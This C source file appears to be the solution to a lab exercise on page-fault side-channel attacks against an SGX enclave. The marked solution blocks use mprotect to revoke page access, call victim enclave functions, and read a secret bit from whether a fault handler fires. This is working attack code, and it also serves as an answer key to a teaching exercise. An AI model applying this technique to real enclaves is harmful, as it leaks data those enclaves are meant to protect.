/* utility headers */
#include "debug.h"
#include "pf.h"
#include "cacheutils.h"
#include <sys/mman.h>
#include "victim.h"

int fault_fired = 0;

void fault_handler(void *base_adrs)
{
    /* =========================== START SOLUTION =========================== */
    /* 3. Restore access rights and continue enclave */
    info("Restoring access rights..");
    ASSERT(!mprotect(&a, 4096, PROT_READ | PROT_WRITE));
    /* =========================== END SOLUTION =========================== */

    fault_fired++;
}

int main( int argc, char **argv )
{
    int rv = 1, secret = 0;

    /* ---------------------------------------------------------------------- */
    info("registering fault handler..");
    register_fault_handler(fault_handler);
    info("a at %p\n", &a);

    /* ---------------------------------------------------------------------- */
    info_event("inc_secret attack");

    /* =========================== START SOLUTION =========================== */
    /* 1. Revoke page access rights with mprotect system call */
    ASSERT(!mprotect(&a, 4096, PROT_NONE)); 
    fault_fired = 0;

    /* 2. Execute victim */
    ecall_inc_secret(/*secret=*/0);
    info("ecall_inc_secret(0) returned! SECRET=%d", fault_fired ? 1 : 0);

    ASSERT(!mprotect(&a, 4096, PROT_NONE)); 
    fault_fired = 0;
    ecall_inc_secret(/*secret=*/1);
    info("ecall_inc_secret(1) returned! SECRET=%d", fault_fired ? 1 : 0);
    /* =========================== END SOLUTION =========================== */

    /* ---------------------------------------------------------------------- */
    info_event("inc_secret_maccess attack");

    /* =========================== START SOLUTION =========================== */
    ASSERT(!mprotect(&a, 4096, PROT_READ)); 
    fault_fired = 0;
    ecall_inc_secret_maccess(/*secret=*/0);
    info("ecall_inc_secret_maccess(0) returned! SECRET=%d", fault_fired ? 1 : 0);

    ASSERT(!mprotect(&a, 4096, PROT_READ)); 
    fault_fired = 0;
    ecall_inc_secret_maccess(/*secret=*/1);
    info("ecall_inc_secret_maccess(1) returned! SECRET=%d", fault_fired ? 1 : 0);
    /* =========================== END SOLUTION =========================== */

    /* ---------------------------------------------------------------------- */

    info("all is well; exiting..");
	return 0;
}
